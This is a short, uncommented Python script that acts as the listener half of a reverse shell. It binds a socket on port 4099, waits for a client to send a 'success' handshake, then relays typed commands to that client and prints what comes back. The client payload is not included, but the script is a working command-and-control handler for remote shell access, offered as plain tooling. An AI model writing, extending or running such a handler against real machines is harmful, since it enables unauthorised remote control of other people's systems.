import socket, os, sys


def socketCreate():
	try:
		global host 
		global port 
		global s 

		host = "localhost"
		port = 4099

		s = socket.socket()

	except socket.error as msg:
		print("[!] There was a problem creating the socket -> ", str(msg[0]))


def socketBind():
	try:
		global host 
		global port 
		global s

		print("[+] Binding socket at port ", port)
		s.bind((host, port))

		s.listen(5)
		print("[+] Server is now active on", host, port)
	except socket.error as msg:
		
		print("[!] There was a problem binding the socket -> ", str(msg[0]))
		print("[+] Retrying ..")
		socketBind()


def socketAccept():
	print("[+] Awaiting connections")
	conn, address = s.accept()
	if str(conn.recv(1024), "utf-8") == "success":
		print("[+] Connection has been established <> " + address[0] + str(address[1]))
		handleCommands(conn)
		conn.close()
	else:
		print("[!] Handshake with " + address[0] + " was unsuccessful")
		conn.close()
		socketAccept()

def handleCommands(conn):
	while True:
		cmd = input()

		if cmd == "terminate":
			conn.close()
			socketAccept()

		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024), "utf-8")
			print(client_response, end="")


def main():
	socketCreate()
	socketBind()
	socketAccept()

main()